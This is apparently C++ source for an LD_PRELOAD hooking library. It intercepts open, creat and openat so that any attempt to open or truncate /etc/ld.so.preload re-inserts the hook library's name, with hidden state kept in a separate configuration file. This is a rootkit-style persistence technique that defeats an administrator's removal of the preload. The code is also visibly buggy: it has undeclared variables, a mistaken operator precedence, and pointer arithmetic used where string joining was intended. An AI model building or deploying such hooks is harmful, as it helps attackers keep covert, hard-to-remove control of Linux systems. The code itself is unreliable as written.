
#include <main.h>


//static DESCR_AND_FLAGS dsInfo;



int open(const char *pathname, int flags, mode_t mode) {
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
	std::string file (pathname);
	char chArr[2];
	
	
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	assert (pwrPtr != NULL);
	
	file = getClearName (file);
	
	// Is the ld.so.preload opening ?
	if (!strcmp (prelFileNameClear, file.c_str ())) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
// fcntl (); // to lock mandatory the file
		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
		
		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
		if (-1 == ind) {
			if (flags & O_CREAT) return opnPtr (pathname, flags & (~O_TRUNC), mode);
			else return -1;
		}
		// the file doesn't exist
		if (chArr[0] == not_created) {
			if (!flags & O_CREAT) return -1;
			else {
				int ret = opnPtr (pathname, flags & (~O_TRUNC), mode);
				if (ret != -1) while (pwrite (*fd, &created, 1, 0) == -1 && errno == EINTR);
				return ret;
			}
		}
		// the file exists
		if (flags & O_TRUNC) {
			struct stat buf;
			int ret = opnPtr (pathname, O_RDWR | O_TRUNC);
			if (ret == -1) return ret;
			
			while (pwrPtr (ret,
						   hookLibraryName.c_str () + ' ',
						   hookLibraryName.size (),
						   0
				  ) == -1 && errno == EINTR
			);
			while (pwrPtr (*fd,
						   (std::string (created) + not_writed).c_str (),
						   (std::string (created) + not_writed).size (),
						   0
				  ) == -1 && errno == EINTR
			);
			
			return opnPtr (pathname, flags & (~O_TRUNC), mode);
		}
		return opnPtr (pathname, flags, mode);
	}
	
	// this file isn't intersted for us
	return opnPtr (pathname, flags, mode);
}

int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
	CErrnoSaver serr;
	CREAT crtPtr = (CREAT)dlsym (RTLD_NEXT, "creat");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	std::string file (pathname);
	char chArr[2];
	
	
	assert (crtPtr != NULL);
	assert (rdPtr != NULL);
	
	file = getClearName (file);
	
	if (!strcmp (prelFileNameClear, file.c_str ())) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR);
// fcntl (); // to lock mandatory the file
		
		int ret = crtPtr (pathname, mode);
		if (ret == -1) return ret;
		while (pwrite (ret,
					   hookLibraryName.c_str () + ' ',
					   hookLibraryName.size (), 0
			  ) == -1 && errno == EINTR
		);
		while (pwrPtr (*fd,
					   (std::string (created) + not_writed).c_str (),
					   (std::string (created) + not_writed).size (),
					   0
			  ) == -1 && errno == EINTR
		);
		return ret;
	}
	
	
	return crtPtr (pathname, mode);
}

int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
	CErrnoSaver serr;
	OPENAT opnPtr = (OPENAT)dlsym (RTLD_NEXT, "openat");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
	std::string file (pathname);
	char chArr[2];
	
	
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	assert (pwrPtr != NULL);
	
	file = getClearName (file);
	
	// Is the ld.so.preload opening ?
	if (!strcmp (prelFileNameClear, file.c_str ())) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
// fcntl (); // to lock mandatory the file
		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
		
		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
		if (-1 == ind) {
			if (flags & O_CREAT) return opnPtr (pathname, flags & (~O_TRUNC), mode);
			else return -1;
		}
		// the file doesn't exist
		if (chArr[0] == not_created) {
			if (!flags & O_CREAT) return -1;
			else {
				int ret = opnPtr (pathname, flags & (~O_TRUNC), mode);
				if (ret != -1) while (pwrite (*fd, &created, 1, 0) == -1 && errno == EINTR);
				return ret;
			}
		}
		// the file exists
		if (flags & O_TRUNC) {
			struct stat buf;
			int ret = opnPtr (pathname, O_RDWR | O_TRUNC);
			if (ret == -1) return ret;
			
			while (pwrPtr (ret,
						   hookLibraryName.c_str () + ' ',
						   hookLibraryName.size (),
						   0
				  ) == -1 && errno == EINTR
			);
			while (pwrPtr (*fd,
						   (std::string (created) + not_writed).c_str (),
						   (std::string (created) + not_writed).size (),
						   0
				  ) == -1 && errno == EINTR
			);
			
			return opnPtr (pathname, flags & (~O_TRUNC), mode);
		}
		return opnPtr (pathname, flags, mode);
	}
	
	// this file isn't intersted for us
	return opnPtr (pathname, flags, mode);
}
